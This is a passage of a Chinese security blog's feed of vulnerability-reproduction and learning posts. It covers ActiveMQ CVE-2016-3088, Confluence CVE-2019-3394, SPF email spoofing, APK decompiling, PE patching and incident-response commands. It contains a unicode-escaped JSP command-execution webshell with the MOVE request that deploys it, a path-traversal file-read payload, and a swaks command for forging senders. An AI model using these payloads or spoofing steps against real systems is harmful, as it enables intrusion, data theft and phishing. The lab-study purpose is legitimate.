class="line">\u0069\u0066\u0020\u0028\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\u0022\u0029\u0020\u0021\u003d\u0020\u006e\u0075\u006c\u006c\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e\u0028\u0022\u0043\u006f\u006d\u006d\u0061\u006e\u0064\u003a\u0020\u0022\u0020\u002b\u0020\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\u0022\u0029\u0020\u002b\u0020\u0022\u005c\u006e\u003c\u0042\u0052\u003e\u0022\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0050\u0072\u006f\u0063\u0065\u0073\u0073\u0020\u0070\u0020\u003d\u0020\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0022\u0063\u006d\u0064\u002e\u0065\u0078\u0065\u0020\u002f\u0063\u0020\u0022\u0020\u002b\u0020\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\u0022\u0029\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u006f\u0073\u0020\u003d\u0020\u0070\u002e\u0067\u0065\u0074\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u0069\u006e\u0020\u003d\u0020\u0070\u002e\u0067\u0065\u0074\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0044\u0061\u0074\u0061\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u0064\u0069\u0073\u0020\u003d\u0020\u006e\u0065\u0077\u0020\u0044\u0061\u0074\u0061\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0069\u006e\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u0064\u0069\u0073\u0072\u0020\u003d\u0020\u0064\u0069\u0073\u002e\u0072\u0065\u0061\u0064\u004c\u0069\u006e\u0065\u0028\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0077\u0068\u0069\u006c\u0065\u0020\u0028\u0020\u0064\u0069\u0073\u0072\u0020\u0021\u003d\u0020\u006e\u0075\u006c\u006c\u0020\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e\u0028\u0064\u0069\u0073\u0072\u0029\u003b\u0020\u0064\u0069\u0073\u0072\u0020\u003d\u0020\u0064\u0069\u0073\u002e\u0072\u0065\u0061\u0064\u004c\u0069\u006e\u0065\u0028\u0029\u003b\u0020\u007d\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u007d</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/content.png" alt></p><p>由于在fileserver这个路径下无法解析，我们接下来要使用MOVE方式移动到web能解析的目录下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MOVE /fileserver/123123.txt HTTP/1.1</span><br><span class="line">Destination: file:///C:/apache-activemq-5.4.3/webapps/admin/sys1.jsp</span><br><span class="line">Host: xxx:8161</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=1pyt7l1je0zt0oka428srh0r6</span><br><span class="line">Content-Length: 4</span><br></pre></td></tr></table></figure></p><p><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/success.png" alt><br>注意有三个回车在最后鸭</p><p><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/admin.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;漏洞编号：CVE-2016-3088&lt;/li&gt;
&lt;li&gt;利用条件：需要登录在admin或者api中，默认密码为admin&lt;br&gt;&lt;img src=&quot;/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/1.png&quot; alt&gt;&lt;/li&gt;
&lt;
      
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>应急响应基础知识和命令</title>
    <link href="http://sherlocz.github.io/2020/03/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E5%91%BD%E4%BB%A4/"/>
    <id>http://sherlocz.github.io/2020/03/24/应急响应基础知识和命令/</id>
    <published>2020-03-24T09:42:22.000Z</published>
    <updated>2020-03-26T06:32:49.989Z</updated>
    
    <content type="html"><![CDATA[<p>最近在开始学习应急响应的相关知识，接触到了很多，比方说白加黑啊、几个APT组织啊，流量分析、天眼分析等等，其实还没有实际接触过应急响应，这里就先做个最基础的笔记，等会让我想想整体的框架是啥。</p><p>好了知道怎么写了，大概就这么写吧，这里不详细记录应急的过程，记录下一些基础的命令、工具和词汇。</p><p>应急一般会有：勒索病毒、挖矿木马、DDoS、APT攻击等。</p><p>不过主要的还是勒索和挖矿两种。</p><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>文件分析命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#查看tmp目录下的文件</span><br><span class="line">ls –alt /tmp/</span><br><span class="line"></span><br><span class="line">#查看开机启动项</span><br><span class="line">ls -alt /etc/init.d/</span><br><span class="line"></span><br><span class="line">#按时间排序查看指定目录下的文件</span><br><span class="line">ls -alt | head -n 10</span><br><span class="line"></span><br><span class="line">#查看文件创建修改时间信息</span><br><span class="line">stat</span><br><span class="line"></span><br><span class="line">#查看历史命令记录文件</span><br><span class="line">cat /root/.bash_history | more</span><br><span class="line"></span><br><span class="line">#查看操作系统用户信息文件/etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line"></span><br><span class="line">#查找24小时内被修改的php文件</span><br><span class="line">find ./ -mtime 0 -name &quot;*.php&quot;</span><br><span class="line"></span><br><span class="line">#查找72小时内新增的文件</span><br><span class="line">find / -ctime 2</span><br><span class="line"></span><br><span class="line">#查找777的权限的jsp文件</span><br><span class="line">find / *.jpg -perm 4777</span><br><span class="line"></span><br><span class="line">#查看当前的任务计划有哪些</span><br><span class="line">crontab -l</span><br><span class="line"></span><br><span class="line">#查看etc目录任务计划相关文件</span><br><span class="line">ls /etc/cron*</span><br></pre></td></tr></table></figure></p><p>进程分析命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#查看本机网络连接情况</span><br><span class="line">netstat -antlp | more</span><br><span class="line"></span><br><span class="line">#根据netstat定位出pid，使用ps命令分析进程</span><br><span class="line">ps aux | grep pid | grep -v grep</span><br></pre></td></tr></table></figure></p><p>日志分析命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#查看系统中所有用户最近一次登陆信息</span><br><span class="line">lastlog</span><br><span class="line"></span><br><span class="line">#显示用户错误的登陆列表</span><br><span class="line">lastb</span><br><span class="line"></span><br><span class="line">#显示用户最近登陆信息（数据源为/var/log/wtmp、/var/log/btmp）</span><br><span class="line">last</span><br></pre></td></tr></table></figure></p><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p>【开始】-&gt;【运行】<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msconfig//查看开机启动项</span><br><span class="line">%UserProfile%\Recent//Recent最近打开的文件夹</span><br><span class="line">compmgmt.msc//计算机管理</span><br><span class="line">eventvwr//事件管理器</span><br></pre></td></tr></table></figure></p><p>CMD命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#查看当前网络连接</span><br><span class="line">netstat -aon</span><br><span class="line">netstat -aon | findstr ESTABLISHED</span><br><span class="line"></span><br><span class="line">#根据netstat定位pid，根据pid定位进程</span><br><span class="line">tasklist | findstr 1228</span><br><span class="line"></span><br><span class="line">#根据wmic process获取进程的全部路径</span><br><span class="line">wmic process | findstr &quot;xxxx.exe&quot;</span><br><span class="line"></span><br><span class="line">#查看用户信息</span><br><span class="line">net user username</span><br><span class="line"></span><br><span class="line">#查看当前系统用户对话</span><br><span class="line">query user</span><br><span class="line"></span><br><span class="line">#踢出用户</span><br><span class="line">logoff</span><br><span class="line"></span><br><span class="line">#查看系统版本及补丁信息</span><br><span class="line">systeminfo</span><br></pre></td></tr></table></figure></p><p>系统信息排查：<br>1、查看环境变量<br>2、查看Windows计划<br>3、查看账号信息，如隐藏用户等；</p><p>排查工具：<br>1、PC Hunter<br>2、ProcessExplorer<br>3、Microsoft Network Monitor</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近在开始学习应急响应的相关知识，接触到了很多，比方说白加黑啊、几个APT组织啊，流量分析、天眼分析等等，其实还没有实际接触过应急响应，这里就先做个最基础的笔记，等会让我想想整体的框架是啥。&lt;/p&gt;
&lt;p&gt;好了知道怎么写了，大概就这么写吧，这里不详细记录应急的过程，记录下一
      
    
    </summary>
    
    
    
      <category term="应急响应" scheme="http://sherlocz.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>Confluence文件读取漏洞复现(CVE-2019-3394)</title>
    <link href="http://sherlocz.github.io/2020/03/24/Confluence%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-3394/"/>
    <id>http://sherlocz.github.io/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/</id>
    <published>2020-03-24T02:30:01.000Z</published>
    <updated>2020-03-24T04:08:00.344Z</updated>
    
    <content type="html"><![CDATA[<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>6.1.0 &lt;= version &lt; 6.6.16<br>6.7.0 &lt;= version &lt; 6.13.7<br>6.14.0 &lt;= version &lt; 6.15.8</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用P师傅的vulhub直接上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker-compose</span><br><span class="line"># Download the latest version of the vulhub </span><br><span class="line">git clone https://github.com/vulhub/vulhub.git  </span><br><span class="line"># Entry vulnerability directory </span><br><span class="line">cd /confluence/CVE-2019-3396/</span><br><span class="line"># Compile (optional) </span><br><span class="line">docker-compose build </span><br><span class="line"># Run </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p><p>安装完成之后本地会开启8090端口，我们根据导向进行安装<br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/1.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/2.png" alt><br>这里我们需要去官网获取一个licence，注意这里的Server ID，成功获取之后在Setup页面点击下一步，等他转圈圈就行了<br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/3.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/4.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/5.png" alt><br>然后稀里糊涂就安装成功了。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>创建页面的时候抓包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT /rest/api/content/65603?status=draft HTTP/1.1</span><br><span class="line">Host: 192.168.75.138:8090</span><br><span class="line">Content-Length: 373</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</span><br><span class="line">Content-Type: application/json; charset=UTF-8</span><br><span class="line">Origin: http://192.168.75.138:8090</span><br><span class="line">Referer: http://192.168.75.138:8090/pages/resumedraft.action?draftId=65603&amp;draftShareId=e3bf8f62-5cdc-4586-ae67-0098ed31f5a5</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=EB2B904418498E2A22446B8A4D44664A</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;status&quot;:&quot;current&quot;,&quot;title&quot;:&quot;123123&quot;,&quot;space&quot;:&#123;&quot;key&quot;:&quot;SHER&quot;&#125;,&quot;body&quot;:&#123;&quot;editor&quot;:&#123;&quot;value&quot;:&lt;p&gt;1231231&lt;/p&gt;</span><br><span class="line">&quot;,&quot;representation&quot;:&quot;editor&quot;,&quot;content&quot;:&#123;&quot;id&quot;:&quot;65603&quot;&#125;&#125;&#125;,&quot;id&quot;:&quot;65603&quot;,&quot;type&quot;:&quot;page&quot;,&quot;version&quot;:&#123;&quot;number&quot;:1,&quot;minorEdit&quot;:true,&quot;syncRev&quot;:&quot;0.2ROrHE4DizkcCc1u6UtkBrc.10&quot;&#125;,&quot;ancestors&quot;:[&#123;&quot;id&quot;:&quot;65584&quot;,&quot;type&quot;:&quot;page&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure></p><p>将其中的value值修改成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;img class=\&quot;confluence-embedded-image\&quot; src=\&quot;/packages/../web.xml\&quot; /&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure></p><p>然后再导出word的时候抓包</p><p><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/6.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/7.png" alt></p><p>RCE<br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/8.png" alt></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/jas502n/CVE-2019-3394" title="https://github.com/jas502n/CVE-2019-3394" target="_blank" rel="noopener">CVE-2019-3394</a><br><a href="https://github.com/Yt1g3r/CVE-2019-3396_EXP" title="https://github.com/Yt1g3r/CVE-2019-3396_EXP" target="_blank" rel="noopener">https://github.com/Yt1g3r/CVE-2019-3396_EXP</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;影响范围&quot;&gt;&lt;a href=&quot;#影响范围&quot; class=&quot;headerlink&quot; title=&quot;影响范围&quot;&gt;&lt;/a&gt;影响范围&lt;/h1&gt;&lt;p&gt;6.1.0 &amp;lt;= version &amp;lt; 6.6.16&lt;br&gt;6.7.0 &amp;lt;= version &amp;lt; 6.
      
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>利用spf伪造邮箱发送</title>
    <link href="http://sherlocz.github.io/2020/03/23/%E5%88%A9%E7%94%A8spf%E4%BC%AA%E9%80%A0%E9%82%AE%E7%AE%B1%E5%8F%91%E9%80%81/"/>
    <id>http://sherlocz.github.io/2020/03/23/利用spf伪造邮箱发送/</id>
    <published>2020-03-23T04:40:56.000Z</published>
    <updated>2020-03-23T04:49:58.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SPF"><a href="#SPF" class="headerlink" title="SPF"></a>SPF</h1><p>看网易官方对SPF的定义：<br><img src="/2020/03/23/利用spf伪造邮箱发送/163.png" alt></p><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>首先用nslookup命令查看是否存在SPF记录<br><img src="/2020/03/23/利用spf伪造邮箱发送/spf.png" alt></p><p>这里并没有设置SPF，没有SPF字样出现</p><p>Kali启动，输入命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">swaks --to xxx@163.com --from test_nospf@xxx.cn  --body &apos;This is a test mailing&apos; --header &apos;Subject: test&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">常用Swaks指令</span><br><span class="line">--ehlo     [helo-string]：伪造ehlo头信息</span><br><span class="line">--header     [header-and-data]：伪造From、Subject、Message-Id、X-Mailer等头信息</span><br><span class="line">--data     [data-portion]：伪造DATA的全部内容，可直接将邮件源码作为选项</span><br><span class="line">--attach     [attachment-specification]：添加附件</span><br></pre></td></tr></table></figure></p><p><img src="/2020/03/23/利用spf伪造邮箱发送/success.png" alt></p><p>发送成功，看邮箱收到没有</p><p><img src="/2020/03/23/利用spf伪造邮箱发送/mail.png" alt></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[你熟悉得那些诱人的邮件都是如何伪造得？ “<a href="https://mp.weixin.qq.com/s?__biz=MzAwMzc2MDQ3NQ==&amp;mid=2247483932&amp;idx=1&amp;sn=2fdbd77c441354a3b6a4a4b39c4a234f&amp;chksm=9b370a28ac40833ef7f5773e09ea0d38155e5b673e1a63209e81a5ff4fc9e0d1ecc967a1408c&amp;mpshare=1&amp;scene=1&amp;srcid=0323QOmo5lj78Oc1T5xsiQYc&amp;sharer_sharetime=1584933653495&amp;sharer_shareid=603d3452a1da35dfaf9195077f79f3de&amp;key=d3059eb8c008ccac8f45b250923aca43ac9c6c49c8267ffb82d154dcea815a41811dbfb26a5eff335dc717d552f2e0d0e9542bb27c9a11e2b2d00b6aebb8f29e79f3ca5b1b42b32a7b48ff156970177c&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10&amp;version=62080085&amp;lang=zh_CN&amp;exportkey=A947Qcj62k29xmJtfgTCZuk%3D&amp;pass_ticket=hFiImDgckOZoXTtlh24T0c93VTdcIgyprkEcstqbILTiVo%2BeNPKDXHJgWazcpizo&quot;" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzAwMzc2MDQ3NQ==&amp;mid=2247483932&amp;idx=1&amp;sn=2fdbd77c441354a3b6a4a4b39c4a234f&amp;chksm=9b370a28ac40833ef7f5773e09ea0d38155e5b673e1a63209e81a5ff4fc9e0d1ecc967a1408c&amp;mpshare=1&amp;scene=1&amp;srcid=0323QOmo5lj78Oc1T5xsiQYc&amp;sharer_sharetime=1584933653495&amp;sharer_shareid=603d3452a1da35dfaf9195077f79f3de&amp;key=d3059eb8c008ccac8f45b250923aca43ac9c6c49c8267ffb82d154dcea815a41811dbfb26a5eff335dc717d552f2e0d0e9542bb27c9a11e2b2d00b6aebb8f29e79f3ca5b1b42b32a7b48ff156970177c&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10&amp;version=62080085&amp;lang=zh_CN&amp;exportkey=A947Qcj62k29xmJtfgTCZuk%3D&amp;pass_ticket=hFiImDgckOZoXTtlh24T0c93VTdcIgyprkEcstqbILTiVo%2BeNPKDXHJgWazcpizo&quot;</a>)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SPF&quot;&gt;&lt;a href=&quot;#SPF&quot; class=&quot;headerlink&quot; title=&quot;SPF&quot;&gt;&lt;/a&gt;SPF&lt;/h1&gt;&lt;p&gt;看网易官方对SPF的定义：&lt;br&gt;&lt;img src=&quot;/2020/03/23/利用spf伪造邮箱发送/163.png&quot; alt&gt;&lt;/
      
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>App反汇编步骤</title>
    <link href="http://sherlocz.github.io/2020/03/23/App%E5%8F%8D%E6%B1%87%E7%BC%96%E6%AD%A5%E9%AA%A4/"/>
    <id>http://sherlocz.github.io/2020/03/23/App反汇编步骤/</id>
    <published>2020-03-23T02:16:15.000Z</published>
    <updated>2020-07-22T04:09:39.562Z</updated>
    
    <content type="html"><![CDATA[<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><ul><li>apktool.jar apktool.bat</li><li><p>下载地址：<a href="https://ibotpeaches.github.io/Apktool/install/" target="_blank" rel="noopener">https://ibotpeaches.github.io/Apktool/install/</a></p></li><li><p>dex2jar</p></li><li><p>下载地址：<a href="https://sourceforge.net/projects/dex2jar/" target="_blank" rel="noopener">https://sourceforge.net/projects/dex2jar/</a></p></li><li><p>jd-gui.jar</p></li><li><p>下载地址：<a href="http://jd.benow.ca/" target="_blank" rel="noopener">http://jd.benow.ca/</a></p></li><li><p>完整工具包网盘下载地址</p></li><li><a href="https://pan.baidu.com/s/1u9ZAIlnMMHJx9LWRO7OWcA" target="_blank" rel="noopener">https://pan.baidu.com/s/1u9ZAIlnMMHJx9LWRO7OWcA</a></li></ul><h1 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h1><p>首先将下载好的 apktool.jar和apktool.bat复制到C:/Windows下，因为path当中本身就设置了C:/Windows这个路径在环境变量中，当然你也可以自定义路径。</p><p>进入我们测试apk的目录，在命令行下输入：<strong>apktool d abc.apk</strong><br><img src="/2020/03/23/App反汇编步骤/1.png" alt></p><p>这一步之后我们就可以看到apk中的一些源文件了<br><img src="/2020/03/23/App反汇编步骤/2.png" alt></p><p>然后我们将abc文件夹的文件重新打包成apk，进入abc文件夹，输入命令 <strong>apktool b abc</strong>，默认输出abc,apk文件为当前目录</p><p>然后你会看见abc文件夹下新出了一个dist文件夹，里面就存有我们重新打包好之后的apk<br><img src="/2020/03/23/App反汇编步骤/apk.png" alt></p><p>将apk修改成zip文件，然后解压出其中的<strong>classes.dex</strong>文件，将这个文件复制到<strong>dex2jar</strong>文件夹下面，在命令行下运行 <strong>d2j-dex2jar.bat classes.dex</strong><br><img src="/2020/03/23/App反汇编步骤/d2j.png" alt><br>此时看见目录中多出了一个classes-dex2jar.jar的文件<br><img src="/2020/03/23/App反汇编步骤/jar.png" alt></p><p>最后用jd-gui文件打开这个classes-dex2jar.jar文件，我们就能看见源码了<br><img src="/2020/03/23/App反汇编步骤/code.png" alt></p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>apktool d wudawei.apk 解压apk客户端安装包</p><p>使用grep+正则表达式提取过滤出APK中的IP地址:</p><p>grep -E “([0-9]{1,3}[.]){3}[0-9]{1,3}” -r wudawei —color=auto</p><p>使用grep+正则表达式提取过滤出APK中的域名:</p><p>grep -E “https?://[a-zA-Z0-9.\/_&amp;=@$%?~#-]*” -r wudawei —color=auto</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;工具&quot;&gt;&lt;a href=&quot;#工具&quot; class=&quot;headerlink&quot; title=&quot;工具&quot;&gt;&lt;/a&gt;工具&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;apktool.jar apktool.bat&lt;/li&gt;
&lt;li&gt;&lt;p&gt;下载地址：&lt;a href=&quot;https://ibotpe
      
    
    </summary>
    
    
    
      <category term="反汇编" scheme="http://sherlocz.github.io/tags/%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>逆向学习--将messagebox添加到空白区</title>
    <link href="http://sherlocz.github.io/2020/03/21/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-%E5%B0%86messagebox%E6%B7%BB%E5%8A%A0%E5%88%B0%E7%A9%BA%E7%99%BD%E5%8C%BA/"/>
    <id>http://sherlocz.github.io/2020/03/21/逆向学习-将messagebox添加到空白区/</id>
    <published>2020-03-21T08:23:56.000Z</published>
    <updated>2020-03-27T03:04:09.695Z</updated>
    
    <content type="html"><![CDATA[<p>好久没写blog了，但是一直有在学逆向，就是不晓得写什么，感觉很多都是很基础的东西，写的价值不大。</p><p>这里看着教程做了个小小的程序改动，这里自己也来尝试一下吧。</p><ul><li>前置知识：逆向、PE结构、进制</li><li>实现目的：修改OEP(即程序的入口点)，使得程序开始的时候先弹出一个MessageBox然后再运行</li></ul><h1 id="MessageBox"><a href="#MessageBox" class="headerlink" title="MessageBox"></a>MessageBox</h1><p>这个函数简单来说就是弹个小框框,里面的参数我们先不管</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(0, 0, 0, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>VS下进行编译，呼啦啦~<br><img src="/2020/03/21/逆向学习-将messagebox添加到空白区/MessageBox.png" alt></p><h1 id="E8-E9公式"><a href="#E8-E9公式" class="headerlink" title="E8/E9公式"></a>E8/E9公式</h1><p>知道了作用之后，我们在MessageBox函数这里设置断点，来看反汇编代码<br><img src="/2020/03/21/逆向学习-将messagebox添加到空白区/E8.png" alt><br><img src="/2020/03/21/逆向学习-将messagebox添加到空白区/E9.png" alt></p><p>我这里把汇编代码整理一下更加清楚一点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 